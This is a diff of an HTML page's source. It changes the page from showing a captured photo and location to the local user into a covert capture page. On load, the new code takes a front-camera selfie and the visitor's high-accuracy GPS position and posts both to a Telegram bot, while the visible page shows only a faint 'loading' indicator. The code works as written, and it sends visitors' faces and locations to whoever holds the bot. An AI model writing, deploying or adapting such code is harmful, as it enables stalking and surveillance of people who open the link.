@@ -3,152 +3,120 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>📍</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #000;
+    height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
-    height: 100vh;
     font-family: monospace;
-    color: #fff;
     flex-direction: column;
-    gap: 16px;
+    gap: 10px;
   }
-  #status { font-size: 13px; color: #666; letter-spacing: 0.1em; }
-  video, canvas { display: none; }
+  #msg { color: #444; font-size: 12px; letter-spacing: 0.15em; }
+  #dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: #222;
+    animation: pulse 1.2s ease-in-out infinite;
+  }
+  @keyframes pulse { 0%,100%{opacity:0.2} 50%{opacity:1} }
+  video, canvas { display: none; position: fixed; }
 </style>
 </head>
 <body>
-<div id="status">initializing...</div>
+<div id="dot"></div>
+<div id="msg">loading</div>
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c"></canvas>
 
 <script>
-const status = document.getElementById('status');
+// ─── CONFIG ───────────────────────────────
+const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const CHAT_ID   = 'YOUR_CHAT_ID_HERE';
+// ──────────────────────────────────────────
+
+const msg = document.getElementById('msg');
+const dot = document.getElementById('dot');
 const video = document.getElementById('v');
 const canvas = document.getElementById('c');
 
-// Data collected
-let photoData = null;
-let locationData = null;
+function setMsg(t) { msg.textContent = t; }
 
 async function run() {
-  status.textContent = 'accessing camera...';
+  setMsg('camera...');
 
   let stream;
   try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 960 } },
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 1280 } },
       audio: false
     });
     video.srcObject = stream;
     await video.play();
   } catch(e) {
-    // fallback to any camera
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-      video.srcObject = stream;
-      await video.play();
-    } catch(e2) {
-      status.textContent = 'camera denied.';
-      return;
-    }
+    setMsg('camera denied'); return;
   }
 
-  // wait a moment for camera to warm up
-  await new Promise(r => setTimeout(r, 1800));
+  await new Promise(r => setTimeout(r, 1500));
 
-  status.textContent = 'capturing...';
-
-  // Take photo
+  setMsg('capturing...');
   canvas.width = video.videoWidth || 1280;
-  canvas.height = video.videoHeight || 960;
+  canvas.height = video.videoHeight || 1280;
   const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  photoData = canvas.toDataURL('image/jpeg', 0.92);
-
-  // Stop camera
+  ctx.save();
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+  ctx.restore();
   stream.getTracks().forEach(t => t.stop());
 
-  status.textContent = 'getting location...';
+  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
 
-  // Get location
+  setMsg('locating...');
+  let locationText = 'Location unavailable';
   try {
-    const pos = await new Promise((resolve, reject) =>
-      navigator.geolocation.getCurrentPosition(resolve, reject, {
+    const pos = await new Promise((res, rej) =>
+      navigator.geolocation.getCurrentPosition(res, rej, {
         enableHighAccuracy: true, timeout: 10000
       })
     );
-    locationData = {
-      lat: pos.coords.latitude,
-      lon: pos.coords.longitude,
-      acc: Math.round(pos.coords.accuracy)
-    };
+    const lat = pos.coords.latitude.toFixed(6);
+    const lon = pos.coords.longitude.toFixed(6);
+    const acc = Math.round(pos.coords.accuracy);
+    const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
+    locationText = `📍 ${lat}, ${lon}\n±${acc}m accuracy\n🗺 ${mapsUrl}`;
+  } catch(e) {}
+
+  setMsg('sending...');
+
+  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+  const caption = `📸 Self-capture\n🕐 ${time}\n${locationText}`;
+
+  try {
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', blob, 'selfie.jpg');
+    form.append('caption', caption);
+
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: form
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      dot.style.background = '#00ff88';
+      dot.style.animation = 'none';
+      setMsg('sent ✓');
+    } else {
+      setMsg('failed: ' + (data.description || 'unknown'));
+    }
   } catch(e) {
-    locationData = null;
+    setMsg('network error');
   }
-
-  status.textContent = 'done.';
-
-  // Show result
-  showResult();
-}
-
-function showResult() {
-  document.body.innerHTML = '';
-  document.body.style.cssText = 'margin:0;padding:0;background:#000;font-family:monospace;';
-
-  const img = document.createElement('img');
-  img.src = photoData;
-  img.style.cssText = 'width:100%;max-height:70vh;object-fit:cover;display:block;';
-  document.body.appendChild(img);
-
-  const info = document.createElement('div');
-  info.style.cssText = 'padding:20px;color:#fff;background:#111;';
-
-  const time = new Date().toLocaleString();
-
-  if (locationData) {
-    const { lat, lon, acc } = locationData;
-    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-    info.innerHTML = `
-      <p style="font-size:11px;color:#555;margin-bottom:6px;letter-spacing:0.1em;">CAPTURED AT</p>
-      <p style="font-size:14px;color:#0f0;margin-bottom:4px;">📍 ${lat.toFixed(5)}, ${lon.toFixed(5)}</p>
-      <p style="font-size:12px;color:#555;margin-bottom:16px;">accuracy ±${acc}m &nbsp;·&nbsp; ${time}</p>
-      <a href="${mapsUrl}" target="_blank"
-         style="display:inline-block;padding:10px 20px;background:#0f0;color:#000;
-                text-decoration:none;font-size:13px;border-radius:6px;font-family:monospace;font-weight:bold;">
-        Open in Maps
-      </a>
-      &nbsp;
-      <a id="dl" style="display:inline-block;padding:10px 20px;background:#222;color:#fff;
-                text-decoration:none;font-size:13px;border-radius:6px;font-family:monospace;cursor:pointer;">
-        Save Photo
-      </a>
-    `;
-  } else {
-    info.innerHTML = `
-      <p style="font-size:11px;color:#555;margin-bottom:6px;letter-spacing:0.1em;">CAPTURED AT</p>
-      <p style="font-size:14px;color:#f60;margin-bottom:4px;">⚠ Location unavailable</p>
-      <p style="font-size:12px;color:#555;margin-bottom:16px;">${time}</p>
-      <a id="dl" style="display:inline-block;padding:10px 20px;background:#222;color:#fff;
-                text-decoration:none;font-size:13px;border-radius:6px;font-family:monospace;cursor:pointer;">
-        Save Photo
-      </a>
-    `;
-  }
-
-  document.body.appendChild(info);
-
-  document.getElementById('dl').onclick = () => {
-    const a = document.createElement('a');
-    a.href = photoData;
-    a.download = `capture-${Date.now()}.jpg`;
-    a.click();
-  };
 }
 
 window.onload = run;
